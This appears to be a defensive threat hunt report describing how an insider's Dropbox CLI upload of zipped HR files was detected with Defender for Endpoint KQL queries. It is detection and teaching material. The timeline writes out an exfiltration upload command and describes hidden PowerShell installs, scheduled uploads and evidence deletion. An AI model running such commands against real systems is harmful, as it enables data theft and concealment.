## 🕵️ Threat Hunt Report (Unauthorized Dropbox CLI Data Exfiltration)

### 🎯 Detection of Unauthorized Data Exfiltration via Dropbox Command-Line Interface

### 🧪 Example Scenario:

Security detected unusual outbound activity to Dropbox domains. Endpoint monitoring revealed the rapid creation and deletion of a ZIP file containing sensitive HR documents. The use of command-line tools and scheduling behavior led to suspicions of an insider misusing the Dropbox CLI to stealthily exfiltrate data.

---

### 🔎 High-Level Dropbox CLI IoC Discovery Plan:

- Inspect **DeviceFileEvents** for ZIP archive creation in public folders.  
- Query **DeviceProcessEvents** for PowerShell activity and Dropbox CLI usage.  
- Monitor **DeviceNetworkEvents** for outbound connections to dropbox.com.  
- Review scheduled task creation referencing Dropbox-related scripts.

---

### 🧭 Steps Taken:

- Queried **DeviceFileEvents** to locate `HR_Q3_Backups.zip` and related folder activity.  
- Queried **DeviceProcessEvents** for PowerShell hidden executions and Dropbox CLI uploads.  
- Detected outbound traffic to Dropbox over HTTPS.  
- Identified a scheduled task set for recurring weekly Dropbox uploads.  
- Mapped ZIP creation and tool execution to user activity and device telemetry.

---

### 🗂️ Chronological Events:

- Dropbox CLI downloaded and saved to `C:\Tools`.  
- Silent install triggered via hidden PowerShell command.  
- User authenticated Dropbox CLI with personal access token.  
- Sensitive folder zipped into `HR_Q3_Backups.zip` in `C:\Users\Public\Exports`.  
- File uploaded using: `.\dropbox_uploader.bat upload HR_Q3_Backups.zip /Q3_Dumps/`  
- Scheduled task created to run every **Friday at 6 PM**.  
- ZIP archive and Dropbox tool deleted to erase local evidence.

---

### ✅ Summary:

An insider utilized the Dropbox CLI to exfiltrate confidential data without triggering traditional DLP alerts. This stealth method involved automation, use of trusted system tools, and log tampering. Quick deletion of artifacts further hindered traditional alerting mechanisms. Detection was possible through telemetry correlation across file, process, and network events.

---

### 🚨 Response Taken:

- Dropbox-based exfiltration was confirmed on endpoint `WORKSTATION-112`  
- The device was isolated, and the account was disabled pending investigation  
- A forensic disk image was acquired  
- Security policies were updated to block unauthorized CLI upload utilities

---

### 🧾 MDE Tables Referenced:

| **Parameter**         | **Description**                                                   |
|-----------------------|-------------------------------------------------------------------|
| DeviceFileEvents      | Detected creation and deletion of ZIP archive and export folders  |
| DeviceProcessEvents   | Logged PowerShell hidden script, CLI uploads, scheduled task setup|
| DeviceNetworkEvents   | Monitored outbound HTTPS traffic to dropbox.com                   |

---

### 🧠 Detection Queries

```kusto
// Dropbox CLI tool download
DeviceFileEvents
| where FileName has "dropbox"
```
<img width="1019" alt="Screenshot 2025-06-01 at 8 45 27 PM" src="https://github.com/user-attachments/assets/eba4a53b-da90-48ea-bd5b-cfbe0f416769" />

```kusto
// PowerShell script with hidden install
DeviceProcessEvents
| where FileName == "powershell.exe"
| where ProcessCommandLine has_all("Start-Process", "Hidden")
| project Timestamp, DeviceName, ProcessCommandLine
```

```kusto
// Dropbox CLI upload execution
DeviceProcessEvents
| where ProcessCommandLine has_all("dropbox_uploader", "upload")
| project Timestamp, DeviceName, AccountName, ProcessCommandLine
```
<img width="943" alt="Screenshot 2025-06-01 at 8 47 02 PM" src="https://github.com/user-attachments/assets/118be025-1f72-4be2-8cd4-5e2c2b783261" />

```kusto
// ZIP file creation
DeviceFileEvents
| where FileName endswith ".zip"
| where FolderPath has "Exports"
| project Timestamp, FileName, FolderPath, ActionType
```
<img width="1005" alt="Screenshot 2025-06-01 at 8 47 51 PM" src="https://github.com/user-attachments/assets/af89a32a-45c3-48ca-85ce-905cfe92893b" />

```kusto
// Dropbox network activity
DeviceNetworkEvents
| where RemoteUrl has "dropbox.com"
| where RemotePort == 443
| project Timestamp, DeviceName, RemoteIP, RemoteUrl
```
<img width="909" alt="Screenshot 2025-06-01 at 8 48 32 PM" src="https://github.com/user-attachments/assets/b7110934-465c-4011-b626-94d86fac32a1" />

```kusto
// Scheduled task creation
DeviceProcessEvents
| where ProcessCommandLine has "schtasks"
| where ProcessCommandLine has_any("Friday", "18:00")
| project Timestamp, DeviceName, ProcessCommandLine
```
<img width="957" alt="Screenshot 2025-06-01 at 8 49 01 PM" src="https://github.com/user-attachments/assets/10e07d0c-993c-474c-8eaa-e481e8aec9a1" />

---

### ✍️ Created By:

**Author:** Giuseppe Scalzo  
**Date:** June 1, 2025
